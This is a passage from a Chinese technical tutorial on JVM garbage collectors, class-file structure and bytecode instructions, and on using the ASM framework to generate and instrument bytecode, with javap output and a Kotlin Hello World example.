标记-整理算法\n\n虽然标记-复制算法能够很好地应对新生代高回收率的场景，但是放到老年代，它就显得很鸡肋了。我们知道，一般长期都回收不到的对象，才有机会进入到老年代，所以老年代一般都是些钉子户，可能一次GC后，仍然存留很多对象。而标记复制算法会在GC后完整复制整个区域内容，并且会折损50%的区域，显然这并不适用于老年代。\n\n那么我们能否这样，在标记所有待回收对象之后，不急着去进行回收操作，而是将所有待回收的对象整齐排列在一段内存空间中，而需要回收的对象全部往后丢，这样，前半部分的所有对象都是无需进行回收的，而后半部分直接一次性清除即可。\n\n![image-20220222213208681](https://tva1.sinaimg.cn/large/e6c9d24ely1gzmm4g8voxj21vm08ywhj.jpg)\n\n虽然这样能保证内存空间充分使用，并且也没有标记复制算法那么繁杂，但是缺点也是显而易见的，它的效率比前两者都低。甚至，由于需要修改对象在内存中的位置，此时程序必须要暂停才可以，在极端情况下，可能会导致整个程序发生停顿（被称为“Stop The World”）。\n\n所以，我们可以将标记清除算法和标记整理算法混合使用，在内存空间还不是很凌乱的时候，采用标记清除算法其实是没有多大问题的，当内存空间凌乱到一定程度后，我们可以进行一次标记整理算法。\n\n#### 各种垃圾收集器 (只讲部分具有代表性的)\n\n##### Serial\n\n这款垃圾收集器也是元老级别的收集器了，在JDK1.3.1之前，是虚拟机新生代区域收集器的唯一选择。这是一款单线程的垃圾收集器，也就是说，当开始进行垃圾回收时，需要暂停所有的线程，直到垃圾收集工作结束。它的新生代收集算法采用的是标记复制算法，老年代采用的是标记整理算法。\n\n![image-20220223104605648](https://tva1.sinaimg.cn/large/e6c9d24ely1gzn92k8ooej21ae0bc75m.jpg)\n\n可以看到，当进入到垃圾回收阶段时，所有的用户线程必须等待GC线程完成工作，就相当于你打一把游戏，中途每隔1分钟网络就卡5秒钟，这确实让人难以接受。\n\n虽然缺点很明显，但是优势也是显而易见的：\n\n1. 设计简单而高效。\n2. 在用户的桌面应用场景中，内存一般不大，可以在较短时间内完成垃圾收集，只要不频繁发生，使用串行回收器是可以接受的。\n\n##### ParNew\n\n这款垃圾收集器相当于是Serial收集器的多线程版本，它能够支持多线程垃圾收集：\n\n![image-20220223111344962](https://tva1.sinaimg.cn/large/e6c9d24ely1gzn9vbvb0mj21c20c00uc.jpg)\n\n除了多线程支持以外，其他内容基本与Serial收集器一致，并且目前某些JVM默认的服务端模式新生代收集器就是使用的ParNew收集器。\n\n##### CMS\n\n在JDK1.5，HotSpot推出了一款在强交互应用中几乎可认为有划时代意义的垃圾收集器：CMS（Concurrent-Mark-Sweep）收集器，这款收集器是HotSpot虚拟机中第一款真正意义上的并发（注意这里的并发和之前的并行是有区别的，并发可以理解为同时运行用户线程和GC线程，而并行可以理解为多条GC线程同时工作）收集器，它第一次实现了让垃圾收集线程与用户线程同时工作。\n\n它主要采用标记清除算法：\n\n![image-20220223114019381](https://tva1.sinaimg.cn/large/e6c9d24ely1gznamys2bdj21as0co404.jpg)\n\n它的垃圾回收分为4个阶段：\n\n* 初始标记（需要暂停用户线程）：这个阶段的主要任务仅仅只是标记出GC Roots能直接关联到的对象，速度比较快，不用担心会停顿太长时间。\n* 并发标记：从GC Roots的直接关联对象开始遍历整个对象图的过程，这个过程耗时较长但是不需要停顿用户线程，可以与垃圾收集线程一起并发运行。\n* 重新标记（需要暂停用户线程）：由于并发标记阶段可能某些用户线程会导致标记产生变得，因此这里需要再次暂停所有线程进行并行标记，这个时间会比初始标记时间长一丢丢。\n* 并发清除：最后就可以直接将所有标记好的无用对象进行删除，因为这些对象程序中也用不到了，所以可以与用户线程并发运行。\n\n虽然它的优点非常之大，但是缺点也是显而易见的，我们之前说过，标记清除算法会产生大量的内存碎片，导致可用连续空间逐渐变少，长期这样下来，会有更高的概率触发Full GC，并且在与用户线程并发执行的情况下，也会占用一部分的系统资源，导致用户线程的运行速度一定程度上减慢。\n\n不过，如果你希望的是最低的GC停顿时间，这款垃圾收集器无疑是最佳选择，不过自从G1收集器问世之后，CMS收集器不再推荐使用了。\n\n##### Garbage First (JDK9+)\n\n此垃圾收集器也是一款划时代的垃圾收集器，在JDK7的时候正式走上历史舞台，它是一款主要面向于服务端的垃圾收集器，并且在JDK9时，取代了JDK8默认的 Parallel Scavenge + Parallel Old 的回收方案。\n\n我们知道，我们的垃圾回收分为`Minor GC`、`Major GC `和`Full GC`，它们分别对应的是新生代，老年代和整个堆内存的垃圾回收，而G1收集器巧妙地绕过了这些约定，它将整个Java堆划分成`2048`个大小相同的独立`Region`块，每个`Region块`的大小根据堆空间的实际大小而定，整体被控制在1MB到32MB之间，且都为2的N次幂。所有的`Region`大小相同，且在JVM的整个生命周期内不会发生改变。\n\n那么分出这些`Region`有什么意义呢？每一个`Region`都可以根据需要，自由决定扮演哪个角色（Eden、Survivor和老年代），收集器会根据对应的角色采用不同的回收策略。此外，G1收集器还存在一个Humongous区域，它专门用于存放大对象（一般认为大小超过了Region容量一半的对象为大对象）这样，新生代、老年代在物理上，不再是一个连续的内存区域，而是到处分布的。\n\n![image-20220223123636582](https://tva1.sinaimg.cn/large/e6c9d24ely1gznc9jvdzdj21f40eiq4g.jpg)\n\n它的回收过程与CMS大体类似：\n\n![image-20220223123557871](https://tva1.sinaimg.cn/large/e6c9d24ely1gznc8vqqqij21h00emwgt.jpg)\n\n分为以下四个步骤：\n\n* 初始标记（暂停用户线程）：仅仅只是标记一下GC Roots能直接关联到的对象，并且修改TAMS指针的值，让下一阶段用户线程并发运行时，能正确地在可用的Region中分配新对象。这个阶段需要停顿线程，但耗时很短，而且是借用进行Minor GC的时候同步完成的，所以G1收集器在这个阶段实际并没有额外的停顿。\n* 并发标记：从GC Root开始对堆中对象进行可达性分析，递归扫描整个堆里的对象图，找出要回收的对象，这阶段耗时较长，但可与用户程序并发执行。\n* 最终标记（暂停用户线程）：对用户线程做一个短暂的暂停，用于处理并发标记阶段漏标的那部分对象。\n* 筛选回收：负责更新Region的统计数据，对各个Region的回收价值和成本进行排序，根据用户所期望的停顿时间来制定回收计划，可以自由选择任意多个Region构成回收集，然后把决定回收的那一部分Region的存活对象复制到空的Region中，再清理掉整个旧Region的全部空间。这里的操作涉及存活对象的移动，是必须暂停用户线程，由多个收集器线程并行完成的。\n\n##### Shenandoah & ZGC (低延迟)\n\n专为低延迟场景特化的垃圾收集器，论综合表现可能比不上G1，但他们暂停线程的时间比G1还要短得多。适合一些对GC延迟有特殊要求的特殊场景。具体不想介绍了，有兴趣可以课下了解，他们的几乎整个工作过程都是并发的，工作原理蛮有意思的。\n\n## 字节码\n\n终于写到这里了，我最想讲的就是这个，这个也最好玩:D\n\n### 什么是字节码\n\n众所周知，Java是一门跨平台语言，只要能跑JVM的平台都能运行同一份Jar包。而Jar包其实本质上就是一堆class文件和一些资源文件打包放到一个压缩包里罢了，我们也可以直接运行class文件。那么class文件里面有什么内容呢？肯定不可能是机器码吧，如果是机器码要怎么跨平台？答案就是字节码。Kotlin之所以兼容Java，也是因为它是把kt文件编译成字节码，而Java和Kotlin之间的相互调用其实就是字节码之间的调用。JVM内置字节码解释器，在运行时动态解释字节码文件，把字节码翻译成对应平台的机器码运行。\n\n### 类文件的基础结构\n\nClass文件是一组以8个字节为基础单位的二进制流，当遇到需要占用8个字节以上空间的数据项时，则会按照高位在前的方式分割成若干个8个字节进行存储。Class文件使用一种类似于C语言结构体的伪结构来存储数据，这种伪结构中只有两种数据类型: **无符号数**, **表**。后面的解析都以这两种数据类型为基础。\n\n我们先来看一段示例代码\n\n~~~java\npublic class TestClazz {\n    public static void main(String[] args) {\n        int a = 1;\n        int b = 2 + a;\n        System.out.println(sum(a, b));\n    }\n\n    private static int sum(int a, int b) {\n        System.out.println(\"execute sum function.\");\n        return a + b;\n    }\n}\n~~~\n\n我们用`javap -verbose` 指令将它编译并解码为我们肉眼可以观测的字节码\n\n~~~\nClassfile /D:/project/android/ksp-learn/test/build/classes/java/main/kim/bifrost/rain/ksp/TestClazz.class\n  Last modified 2022-7-9; size 754 bytes\n  MD5 checksum 2b38afaa297c7960c988943b0c475282\n  Compiled from \"TestClazz.java\"\npublic class kim.bifrost.rain.ksp.TestClazz\n  minor version: 0\n  major version: 52\n  flags: ACC_PUBLIC, ACC_SUPER\nConstant pool:\n   #1 = Methodref          #8.#27         // java/lang/Object.\"<init>\":()V\n   #2 = Fieldref           #28.#29        // java/lang/System.out:Ljava/io/PrintStream;\n   #3 = Methodref          #7.#30         // kim/bifrost/rain/ksp/TestClazz.sum:(II)I\n   #4 = Methodref          #31.#32        // java/io/PrintStream.println:(I)V\n   #5 = String             #33            // execute sum function.\n   #6 = Methodref          #31.#34        // java/io/PrintStream.println:(Ljava/lang/String;)V\n   #7 = Class              #35            // kim/bifrost/rain/ksp/TestClazz\n   #8 = Class              #36            // java/lang/Object\n   #9 = Utf8               <init>\n  #10 = Utf8               ()V\n  #11 = Utf8               Code\n  #12 = Utf8               LineNumberTable\n  #13 = Utf8               LocalVariableTable\n  #14 = Utf8               this\n  #15 = Utf8               Lkim/bifrost/rain/ksp/TestClazz;\n  #16 = Utf8               main\n  #17 = Utf8               ([Ljava/lang/String;)V\n  #18 = Utf8               args\n  #19 = Utf8               [Ljava/lang/String;\n  #20 = Utf8               a\n  #21 = Utf8               I\n  #22 = Utf8               b\n  #23 = Utf8               sum\n  #24 = Utf8               (II)I\n  #25 = Utf8               SourceFile\n  #26 = Utf8               TestClazz.java\n  #27 = NameAndType        #9:#10         // \"<init>\":()V\n  #28 = Class              #37            // java/lang/System\n  #29 = NameAndType        #38:#39        // out:Ljava/io/PrintStream;\n  #30 = NameAndType        #23:#24        // sum:(II)I\n  #31 = Class              #40            // java/io/PrintStream\n  #32 = NameAndType        #41:#42        // println:(I)V\n  #33 = Utf8               execute sum function.\n  #34 = NameAndType        #41:#43        // println:(Ljava/lang/String;)V\n  #35 = Utf8               kim/bifrost/rain/ksp/TestClazz\n  #36 = Utf8               java/lang/Object\n  #37 = Utf8               java/lang/System\n  #38 = Utf8               out\n  #39 = Utf8               Ljava/io/PrintStream;\n  #40 = Utf8               java/io/PrintStream\n  #41 = Utf8               println\n  #42 = Utf8               (I)V\n  #43 = Utf8               (Ljava/lang/String;)V\n{\n  public kim.bifrost.rain.ksp.TestClazz();\n    descriptor: ()V\n    flags: ACC_PUBLIC\n    Code:\n      stack=1, locals=1, args_size=1\n         0: aload_0\n         1: invokespecial #1                  // Method java/lang/Object.\"<init>\":()V\n         4: return\n      LineNumberTable:\n        line 10: 0\n      LocalVariableTable:\n        Start  Length  Slot  Name   Signature\n            0       5     0  this   Lkim/bifrost/rain/ksp/TestClazz;\n\n  public static void main(java.lang.String[]);\n    descriptor: ([Ljava/lang/String;)V\n    flags: ACC_PUBLIC, ACC_STATIC\n    Code:\n      stack=3, locals=3, args_size=1\n         0: iconst_1\n         1: istore_1\n         2: iconst_2\n         3: iload_1\n         4: iadd\n         5: istore_2\n         6: getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;\n         9: iload_1\n        10: iload_2\n        11: invokestatic  #3                  // Method sum:(II)I\n        14: invokevirtual #4                  // Method java/io/PrintStream.println:(I)V\n        17: return\n      LineNumberTable:\n        line 12: 0\n        line 13: 2\n        line 14: 6\n        line 15: 17\n      LocalVariableTable:\n        Start  Length  Slot  Name   Signature\n            0      18     0  args   [Ljava/lang/String;\n            2      16     1     a   I\n            6      12     2     b   I\n}\nSourceFile: \"TestClazz.java\"\n~~~\n\n#### 魔数 & Class文件版本\n\nclass文件的前4个Byte被称为魔数(Magic Number), 这些魔数的意义在于标识class文件。在类的加载阶段会根据这头四个Byte判断是否是合法的class文件。魔数的选取也颇有历史渊源`0xCAFE BABE`，Java的创始人十分喜欢咖啡:)。\n\n![aZx0S4EjfY](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/aZx0S4EjfY.jpg)\n\n![飞书20220709-173350](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220709-173350.jpg)\n\n随后第四个字节，也就是7列存储着字节码的版本号。这里是34，从16进制翻译过来就是52，对应着Java8的字节码版本。\n\n第5和第6个字节是次版本号（Minor Version）,第7，8个字节是主版本号（Major Version）。Java是版本号是从45开始，JDK1.1之后的每个JDK大版本发布主版本号向上+1，高版本的JDK能向下兼容以前版本的Class文件，而不能运行以后版本的Class文件。\n\n#### 常量池\n\n即\n\n~~~\nConstant pool:\n   #1 = Methodref          #8.#27         // java/lang/Object.\"<init>\":()V\n   #2 = Fieldref           #28.#29        // java/lang/System.out:Ljava/io/PrintStream;\n   #3 = Methodref          #7.#30         // kim/bifrost/rain/ksp/TestClazz.sum:(II)I\n   #4 = Methodref          #31.#32        // java/io/PrintStream.println:(I)V\n   #5 = String             #33            // execute sum function.\n   #6 = Methodref          #31.#34        // java/io/PrintStream.println:(Ljava/lang/String;)V\n   #7 = Class              #35            // kim/bifrost/rain/ksp/TestClazz\n   #8 = Class              #36            // java/lang/Object\n   #9 = Utf8               <init>\n  #10 = Utf8               ()V\n  #11 = Utf8               Code\n  #12 = Utf8               LineNumberTable\n  #13 = Utf8               LocalVariableTable\n  #14 = Utf8               this\n  #15 = Utf8               Lkim/bifrost/rain/ksp/TestClazz;\n  #16 = Utf8               main\n  #17 = Utf8               ([Ljava/lang/String;)V\n  #18 = Utf8               args\n  #19 = Utf8               [Ljava/lang/String;\n  #20 = Utf8               a\n  #21 = Utf8               I\n  #22 = Utf8               b\n  #23 = Utf8               sum\n  #24 = Utf8               (II)I\n  #25 = Utf8               SourceFile\n  #26 = Utf8               TestClazz.java\n  #27 = NameAndType        #9:#10         // \"<init>\":()V\n  #28 = Class              #37            // java/lang/System\n  #29 = NameAndType        #38:#39        // out:Ljava/io/PrintStream;\n  #30 = NameAndType        #23:#24        // sum:(II)I\n  #31 = Class              #40            // java/io/PrintStream\n  #32 = NameAndType        #41:#42        // println:(I)V\n  #33 = Utf8               execute sum function.\n  #34 = NameAndType        #41:#43        // println:(Ljava/lang/String;)V\n  #35 = Utf8               kim/bifrost/rain/ksp/TestClazz\n  #36 = Utf8               java/lang/Object\n  #37 = Utf8               java/lang/System\n  #38 = Utf8               out\n  #39 = Utf8               Ljava/io/PrintStream;\n  #40 = Utf8               java/io/PrintStream\n  #41 = Utf8               println\n  #42 = Utf8               (I)V\n  #43 = Utf8               (Ljava/lang/String;)V\n~~~\n\n紧接着主次版本号之后的是常量池入口，常量池可以比喻为Class文件里的资源仓库，它是Class文件结构中与其他项目关联最多的数据。\n\n首先上来就会有一个1字节的无符号数，它用于表示当前常量的类型（常量类型有很多个）这里只列举一部分的类型介绍：\n\n|           类型            | 标志 |                             描述                             |\n| :-----------------------: | :--: | :----------------------------------------------------------: |\n|    CONSTANT_Utf8_info     |  1   |                    UTF-8编码格式的字符串                     |\n|   CONSTANT_Integer_info   |  3   | 整形字面量（第一章我们演示的很大的数字，实际上就是以字面量存储在常量池中的） |\n|    CONSTANT_Class_info    |  7   |                      类或接口的符号引用                      |\n|   CONSTANT_String_info    |  8   |                      字符串类型的字面量                      |\n|  CONSTANT_Fieldref_info   |  9   |                        字段的符号引用                        |\n|  CONSTANT_Methodref_info  |  10  |                        方法的符号引用                        |\n| CONSTANT_MethodType_info  |  16  |                           方法类型                           |\n| CONSTANT_NameAndType_info |  12  |                   字段或方法的部分符号引用                   |\n\n实际上这些东西，虽然我们不知道符号引用是什么东西，我们可以观察出来，这些东西或多或少都是存放类中一些名称、数据之类的东西。\n\n比如我们来看第一个`CONSTANT_Methodref_info`表中存放了什么数据，这里我只列出它的结构表（详细的结构表可以查阅《深入理解Java虚拟机 第三版》中222页总表）：\n\n|          常量           | 项目  | 类型 |                        描述                         |\n| :---------------------: | :---: | :--: | :-------------------------------------------------: |\n| CONSTANT_Methodref_info |  tag  |  u1  |                       值为10                        |\n|                         | index |  u2  |   指向声明方法的类描述父CONSTANT_Class_info索引项   |\n|                         | index |  u2  | 指向名称及类型描述符CONSTANT_NameAndType_info索引项 |\n\n再看看它指向的`CONSTANT_Class_info`和`CONSTANT_NameAndType_info`的结构\n\n|        常量         | 项目  | 类型 |           描述           |\n| :-----------------: | :---: | :--: | :----------------------: |\n| CONSTANT_Class_info |  tag  |  u1  |          值为7           |\n|                     | index |  u2  | 指向全限定名常量项的索引 |\n\n|           常量            | 项目  | 类型 |               描述               |\n| :-----------------------: | :---: | :--: | :------------------------------: |\n| CONSTANT_NameAndType_info |  tag  |  u1  |              值为12              |\n|                           | index |  u2  |  指向字段或方法名称常量项的索引  |\n|                           | index |  u2  | 指向字段或方法描述符常量项的索引 |\n\n##### 方法标识符\n\n再说一下方法标识符，我们先找到sum方法的NameAndType常量\n\n> #30 = NameAndType        #23:#24        // sum:(II)I\n\n我们会发现这里已经为我们标识出来了，#23对应`sum`，也就是方法名称。#24对应`(II)I`即方法标识符。\n\n那么这个(II)I有什么意思呢，括号内的两个I代表该方法有两个int类型的形参，括号后面的I代表该方法的返回值是int类型。\n\n至于不同类型的修饰符，我贴一个表在下面:\n\n![image-20220223192518999](https://tva1.sinaimg.cn/large/e6c9d24ely1gzno2stssaj216i08mjsr.jpg)\n\n构造器的标识符为`()V`，即一个无形参，返回值为void类型的方法。\n\n再举几个例子:\n\n> public Set<ArathothAttribute> getAttrInstSet()\n>\n> ()Ljava/util/Set<ink/rainbowbridge/v1/arathoth/attribute/abstracts/ArathothAttribute;>;\n>\n> 如你所见，泛型并不会在编译时被擦除，只会在运行时\n>\n> 所以我们可以在运行时通过草字节码的方式获得一个已经被擦除的泛型\n\n> public Double getRandom(Double value1, Double value2)\n>\n> (Ljava/lang/Double;Ljava/lang/Double;)Ljava/lang/Double;\n>\n> 装箱后的基础类型实际上是类\n>\n> 提点题外话\n>\n> public double sum(Double value1, double value2) {\n>\n> ​\t\treturn value1 + value2;\n>\n> }\n>\n> 你们觉得它编译出来字节码会怎么样:), 实际上字节码调用了value1的doubleValue()方法得到了未装箱的值，再进行相加。\n>\n> 反之亦然，java有自动装箱和自动拆箱的特性。\n\n> 那么数组会如何呢\n>\n> public double[] getRandomNums()\n>\n> ()[D\n>\n> 当然是在前面加个[\n\n#### 访问标志\n\n即\n\n~~~\n  flags: ACC_PUBLIC, ACC_SUPER\n~~~\n\n从字面上应该就能猜出这些访问标志的意思，它们用来描述一个类/方法/字段的各种修饰符。\n\n类的标志类型:\n\n![image-20220223200619811](https://tva1.sinaimg.cn/large/e6c9d24ely1gznp9glonej216i0hcjui.jpg)\n\n字段的标志类型:\n\n![image-20220223201053780](https://tva1.sinaimg.cn/large/e6c9d24ely1gznpe7is4wj21620eswh4.jpg)\n\n方法的标志类型:\n\n| 标志名称         | 标志值 | 含义                             |\n| ---------------- | ------ | -------------------------------- |\n| ACC_PUBLIC       | 0x0001 | 方法是否为public                 |\n| ACC_PRIVATE      | 0x0002 | 方法是否为private                |\n| ACC_PROTECTED    | 0x0004 | 方法是否为protected              |\n| ACC_STATIC       | 0x0008 | 方法是否为static                 |\n| ACC_FINAL        | 0x0010 | 方法是否为final                  |\n| ACC_SYNCHRONIZED | 0x0020 | 方法是否为synchronized           |\n| ACC_BRIDGE       | 0x0040 | 方法是不是由编译器产生的桥接方法 |\n| ACC_VARARGS      | 0x0080 | 方法是否接受不定参数             |\n| ACC_NATIVE       | 0x0100 | 方法是否为native                 |\n| ACC_ABSTRACT     | 0x0400 | 方法是否为abstract               |\n| ACC_STRICT       | 0x0800 | 方法是否为strictfp               |\n| ACC_SYNTHETIC    | 0x1000 | 方法是否由编译器自动产生         |\n\n#### 字节码指令\n\n> 我觉得字节码要细讲完全可以再单开一篇讲，这里就稍微讲一点基础的，让待会ASM的时候不至于完全懵逼就行\n\n前面讲了这么多基本都是描述类和方法的信息，大家一定很好奇我们编写的程序逻辑到底放在哪里了吧。没错，我们编写的逻辑被编译成了面向操作**操作数栈**的字节码指令。为什么要说它是面向**操作数栈**的操作指令？接下来我会讲一讲main方法中所有字节码指令的作用，听完你们就知道了。\n\n```java\npublic static void main(String[] args) {\n    int a = 1;\n    int b = 2 + a;\n    System.out.println(sum(a, b));\n}\n```\n\n    Code:\n      stack=3, locals=3, args_size=1\n         0: iconst_1\n         1: istore_1\n         2: iconst_2\n         3: iload_1\n         4: iadd\n         5: istore_2\n         6: getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;\n         9: iload_1\n        10: iload_2\n        11: invokestatic  #3                  // Method sum:(II)I\n        14: invokevirtual #4                  // Method java/io/PrintStream.println:(I)V\n        17: return\n\n---\n\n> iconst_1\n\n将一个int类型的常量`1`加载到**操作数栈**, 此时操作数栈深度为1。对应`int a = 1`中1的初始化。\n\n> istore_1\n\n将一个int类型的数值从**操作数栈**顶取出并存储到局部变量表，这个数值在操作数栈的位置为1，即我们刚才压进操作数栈的`1`，对应`int a = 1`中的赋值操作\n\n> iconst_2\n\n将一个int类型的常量`2`加载到**操作数栈**，此时操作数栈深度为2。对应 `int b = 2 + a`中2的初始化\n\n> iload_1\n\n将一个int类型的局部变量直接加载到**操作数栈**，这个局部变量在局部变量表的位置为1。即刚才第二条指令存进局部变量表的局部变量`a`\n\n> iadd\n\n将**操作数栈**顶的两个int类型的数值取出并相加，再压进**操作数栈**中，对应`int b = 2 + a`的加法运算\n\n> istore_2\n\n将一个int类型的数值从**操作数栈**顶中取出并存储到局部变量表，这个数值在**操作数栈**的位置为2，对应`int b = 2 + a`的赋值\n\n> getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;\n\n获取静态域`System.out`, 类型为`Ljava/io/PrintStream`,并将其压入**操作数栈**顶。后面跟的`#2`在常量池中对应`Field java/lang/System.out:Ljava/io/PrintStream;`\n\n> iload_1\n\n将int类型的局部变量`a`加载到**操作数栈**，待用\n\n> iload_2\n\n将int类型的局部变量b加载到**操作数栈**，待用\n\n> invokestatic  #3                  // Method sum:(II)I\n\n执行所在类中的静态方法，传入栈顶的两个int数值作为形参，返回一个int类型的值压入栈顶\n\n> invokevirtual #4                  // Method java/io/PrintStream.println:(I)V\n\n执行`PrintStream#println`方法，传入栈顶元素作为参数，再传入下一个栈顶元素作为receiver（不知道java这个叫什么，反正kotlin有receiver这个概念）\n\n> return\n\n返回void\n\n---\n\n经过上面的分析我们已经大致知道了某些字节码的功能，你肯定也发现了，很大一部分字节码的功能是基于**操作数栈**实现的。\n\n特别是基于栈的数学运算，挺有意思的，我记得我们上学期有一次红岩作业就是实现一个逻辑运算，当时去网上看了一下，要用逆波兰表达式的解析方式配合栈来实现，这应该也是jvm数学运算的实现方式吧，有兴趣可以再写一遍。\n\n这里我就不系统性的讲解字节码指令了，太多了，根本讲不完。但你们可以课下去了解，我一般是遇见不认识的然后再去查:)\n\n### ASM框架\n\n前面我们学习了字节码的基本结构以及部分字节码指令，我们一般使用ASM/Javassist/cglib等字节码操控框架来动态的修改/生成字节码。那么通过它们我们能做到什么事情呢?\n\n- 编译期代码生成/替换 ，一般通过gradle插件干预编译实现（例如著名的gradle插件shadowJar的依赖包重定向(relocate)功能)。字节码插桩也是在这个过程进行。\n- 运行期动态代理，可以做到一些InvocationHandler做不到的事情，例如修改类中包引用的包名。\n- 在获取一些类的信息时，使用asm读取字节码比反射要快得多。\n- 使用jvm一些奇奇怪怪的特性，例如[MeiVinEight/ReflectionFX: Reflection Toolkit (github.com)](https://github.com/MeiVinEight/ReflectionFX)，该项目利用字节码的一些乱七八糟的特性实现了性能开销更小的反射，其性能甚至能够与操作MethodHandle持平。\n\n其实应该还有很多，我就不列举了。\n\n这里可能有人有疑问，我们android不是编译成dex吗，那按照常规的方式操作字节码是可行的吗？答案是可行，因为我们字节码插桩的过程一般是\n\n这里我主要介绍asm框架，它是最流行，最直接的操作字节码的框架，jdk甚至内置了一份。如果从学习字节码的角度来看，asm无疑是最合适的选择。同时安卓中用得比较多的技术就是字节码插桩，所以我准备讲一讲如何用asm框架实现字节码插桩。\n\n#### ASM Core API & Tree API\n\n##### Core API\n\nASM 是基于访问者模式设计的，访问者模式可以让ASM更好的操作某个Jar包/class文件中的所有类/字段/方法。因此要学会ASM，首先必须要了解访问者模式。(我其实懵逼了很久) 如果你们以后有兴趣了解kapt/ksp也会用到访问者模式。（实际上这俩很多时候是跟asm配合着用的, kapt/ksp生成代码，asm对代码进行插桩调用）\n\n[访问者模式 | 菜鸟教程 (runoob.com)](https://www.runoob.com/design-pattern/visitor-pattern.html)\n\n现在我们来讲讲基础用法:\n\nASM基于访问者模式，为我们提供了一套访问class文件中所有属性的API。\n\n```java\npublic abstract class ClassVisitor {\n        ......\n    public void visit(int version, int access, String name, String signature, String superName, String[] interfaces);\n    //访问类字段时回调\n    public FieldVisitor visitField(int access, String name, String desc, String signature, Object value);\n    //访问类方法是回调\n    public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions);\n    public void visitEnd();\n}\n```\n\n在使用ClassVisitor访问类时，一旦访问到其中的属性就会回调到对应的属性的访问方法。\n\n> ###### 1：void visit(int version, int access, String name, String signature, String superName, String[] interfaces)\n>\n> 访问class的头信息\n>\n> version：class版本（编译级别）\n>\n> access： 访问标示\n>\n> name：类名称\n>\n> signature：class的签名，可能是null\n>\n> superName：超类名称\n>\n> interfaces：接口的名称\n>\n> ###### 2：void visitAnnotation(String descriptor, boolean visible)\n>\n> 访问class的注解信息\n>\n> descriptor：描述信息\n>\n> visible：是否运行时可见\n>\n> ###### 3：FieldVisitor visitField(int access, String name,String descriptor, String signature,Object value)\n>\n> 访问class中字段的信息，返回一个FieldVisitor用于获取字段中更加详细的信息。\n>\n> name：字段个的名称\n>\n> descriptor：字段的描述\n>\n> value：该字段的初始值，文档上面说：\n>\n> 该参数，其可以是零，如果字段不具有初始值，必须是一个`Integer`，一`Float`，一`Long`，一个`Double`或一个`String`（对于`int`，`float`，`long` 或`String`分别字段）。*此参数仅用于静态字段*。对于非静态字段，它的值被忽略，非静态字段必须通过构造函数或方法中的字节码指令进行初始化（但是不管我怎么试，结果都是null）。\n>\n> ###### 4：MethodVisitor visitMethod(int access,String name,String descriptor,String signature, String[] exceptions)\n>\n> 访问class中方法的信息，返回一个MethodVisitor用于获取方法中更加详细的信息。\n>\n> name：方法的名称\n>\n> descriptor：方法的描述\n>\n> signature：方法的签名\n>\n> exceptions：方法的异常名称\n>\n> ###### 5：visitInnerClass(String name, String outerName, String innerName, int access)\n>\n> 访问class中内部类的信息。这个内部类不一定是被访问类的成员（这里的意思是可能是一段方法中的**匿名内部类**，或者**声明在一个方法中的类**等等）。\n>\n> name：内部类的名称。例子`com/hebaibai/example/demo/Aoo$1XX`\n>\n> outerName：内部类所在类的名称\n>\n> innerName：内部类的名称\n>\n> ###### 6：visitOuterClass(String owner, String name, String descriptor)\n>\n> 访问该类的封闭类。仅当类具有封闭类时，才必须调用此方法。\n>\n> 我自己试了一下，如果在一个方法中定义了一个class，或者定义个一个匿名内部类，这时通过visitInnerClass方法能够得到例如`com/hebaibai/example/demo/Aoo$1`或者`com/hebaibai/example/demo/Aoo$1XX`的类名称。这时通过使用\n>\n> ```javascript\n> ClassReader classReader = new ClassReader(\"com/hebaibai/example/demo/Aoo$1\");\n>  classReader.accept(new DemoClassVisitor(Opcodes.ASM7), ClassReader.SKIP_CODE);\n> ```\n>\n> 复制\n>\n> 可以得到持有内部类的类信息。\n>\n> owner：拥有该类的class名称\n>\n> name：包含该类的方法的名称，如果该类未包含在其封闭类的方法中，则返回null\n>\n> descriptor：描述\n\nClassVisitor是一个抽象类，我们可以通过继承它来实现自己的ClassVisitor（MethodVistitor/FieldVisitor同)。我们可以插入一段逻辑来获取我们要访问的类的信息，也可以通过改变方法的返回值来修改类的信息。\n\n当然我们也可以直接通过ClassWriter来生成一个类，手动调用它的各种visit方法来向生成的类来写入字节码，下面我们先简简单单写个HelloWorld。\n\n```kotlin\nfun main() {\n    val classWriter = ClassWriter(0)\n    classWriter.visit(\n        V1_8,\n        ACC_PUBLIC + ACC_SUPER,\n        \"org/example/asmlearn/ASMLearn_Test\",\n        null,\n        \"java/lang/Object\",\n        null\n    )\n    val mv = classWriter.visitMethod(\n        ACC_PUBLIC + ACC_STATIC,\n        \"main\",\n        \"([Ljava/lang/String;)V\",\n        null,\n        null\n    )\n    mv.visitFieldInsn(GETSTATIC, \"java/lang/System\", \"out\", \"Ljava/io/PrintStream;\")\n    mv.visitLdcInsn(\"Hello, World!\")\n    mv.visitMethodInsn(INVOKEVIRTUAL, \"java/io/PrintStream\", \"println\", \"(Ljava/lang/String;)V\", false)\n    mv.visitInsn(RETURN)\n    mv.visitMaxs(2, 1)\n    mv.visitEnd()\n    classWriter.visitEnd()\n    val byteArray = classWriter.toByteArray()\n    val classLoader = MyClassLoader()\n    val clazz = classLoader.defineClass(\"org.example.asmlearn.ASMLearn_Test\", byteArray)\n    val m = clazz.getMethod(\"main\", Array<String>::class.java)\n    m.invoke(null, arrayOf(\"\"))\n}\n\nclass MyClassLoader : ClassLoader() {\n    fun defineClass(name: String, b: ByteArray): Class<*> {\n        return defineClass(name, b, 0, b.size)\n    }\n}\n```\n\n这里我们通过asm生成了一个`org/example/asmlearn/ASMLearn_Test`类，并在里面生成了一个main方法，加载到自定义的classLoader中，然后对它进行反射执行main方法。\n\n>  顺便说下生成代码的事情，编译期生成常规代码其实不推荐使用asm，我们一般只在运行期动态生成代码才使用asm。因为asm写起来比较繁琐，运行期用它来生成代码其实是因为没有更好的办法了。编译期如果不是你想实现什么魔法的话一般不用来生成代码，生成代码可以了解一下kapt和ksp，编译期asm一般只是用来在已有的代码中进行插桩。\n\n##### Tree API\n\nTree API基于Core API实现，Tree 